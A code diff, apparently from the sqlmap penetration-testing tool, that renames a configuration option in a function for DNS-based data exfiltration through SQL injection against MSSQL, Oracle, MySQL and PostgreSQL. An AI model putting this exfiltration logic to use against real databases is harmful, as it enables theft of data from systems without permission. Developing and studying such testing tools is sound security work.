@@ -48,7 +48,7 @@ def dnsUse(payload, expression):
     count = 0
     offset = 1
 
-    if conf.dnsDomain and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL):
+    if conf.dName and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL):
         output = hashDBRetrieve(expression, checkConf=True)
 
         if output and PARTIAL_VALUE_MARKER in output or kb.dnsTest is None:
@@ -67,7 +67,7 @@ def dnsUse(payload, expression):
                 nulledCastedField = agent.hexConvertField(nulledCastedField)
                 expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)
 
-                expressionRequest = getSPQLSnippet(Backend.getIdentifiedDbms(), "dns_request", PREFIX=prefix, QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dnsDomain)
+                expressionRequest = getSPQLSnippet(Backend.getIdentifiedDbms(), "dns_request", PREFIX=prefix, QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dName)
                 expressionUnescaped = unescaper.unescape(expressionRequest)
 
                 if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):
@@ -108,7 +108,7 @@ def dnsUse(payload, expression):
             debugMsg = "performed %d queries in %d seconds" % (count, calculateDeltaSeconds(start))
             logger.debug(debugMsg)
 
-    elif conf.dnsDomain:
+    elif conf.dName:
         warnMsg = "DNS data exfiltration method through SQL injection "
         warnMsg += "is currently not available for DBMS %s" % Backend.getIdentifiedDbms()
         singleTimeWarnMessage(warnMsg)
